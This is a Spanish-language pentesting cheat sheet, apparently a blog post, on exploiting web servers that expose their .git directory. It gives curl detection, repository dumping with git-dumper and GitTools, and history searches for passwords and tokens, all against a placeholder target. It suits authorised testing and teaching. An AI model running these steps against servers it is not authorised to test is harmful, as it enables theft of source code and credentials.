---
title: Git Exposed (.git - Puerto 80 / 443)
pubDate: '2025-11-26'
---


## ¿Qué es .git expuesto?
El directorio **.git** contiene todo el historial de versiones de un proyecto, incluyendo el código fuente, los mensajes de commit y las ramas. Si este directorio es accesible a través del servidor web, un atacante puede reconstruir el proyecto completo.

### Riesgos principales
1.  **Robo de Propiedad Intelectual:** Acceso total al código fuente de la aplicación.
2.  **Fuga de Credenciales:** Los desarrolladores a menudo olvidan contraseñas de bases de datos, llaves de API o tokens en versiones antiguas del código.
3.  **Descubrimiento de Vulnerabilidades:** Al analizar el código fuente, es mucho más fácil encontrar fallos lógicos o inyecciones que serían difíciles de detectar "a ciegas".

---

## 🔎 Detección
Si la carpeta `.git/` responde con un código de estado 200, es posible descargar el repositorio.

```bash
# Verificar acceso rápido
curl -I http://target.com/.git/
```

---

## 🚀 Extracción del Repositorio
Usa herramientas diseñadas para descargar los objetos de Git y reconstruir la estructura de carpetas localmente.

### git-dumper (Recomendado)
```bash
# Instalación
pip install git-dumper

# Descarga y reconstruye el repositorio en la carpeta 'output'
git-dumper http://target.com/.git/ output
```

### GitTools (Alternativa)
Si el servidor bloquea el listado de directorios pero los archivos son accesibles.
```bash
# 1. Descarga los objetos crudos
./gitdownloader.sh http://target.com/.git/ repo_raw

# 2. Extrae el código fuente
./gitextractor.sh repo_raw repo_final
```

---

## 🕵️ Análisis de Secretos en el Historial
El verdadero peligro reside en buscar lo que se intentó "borrar" en commits anteriores.

```bash
cd output

# Ver historial resumido
git log --oneline

# Ver cambios exactos en un commit (Busca variables, logins, IPs)
git show <hash_commit>

# Buscar una palabra clave en TODO el historial (muy efectivo)
git log -S "password"
git log -S "DB_PASSWORD"
```

---

## 🛠️ Herramientas de Auditoría Automática
No revises el código a mano si el repositorio es grande.
```bash
# Trufflehog: Busca secretos filtrados en las ramas de git
trufflehog git file://$(pwd)

# Gitleaks: Escanea el repositorio en busca de patrones de claves y tokens
gitleaks detect --source . -v
```

> **Tip:** Presta especial atención a archivos como `.env`, `web.config`, `settings.py` o archivos de configuración de bases de datos que no deberían estar en el repositorio.
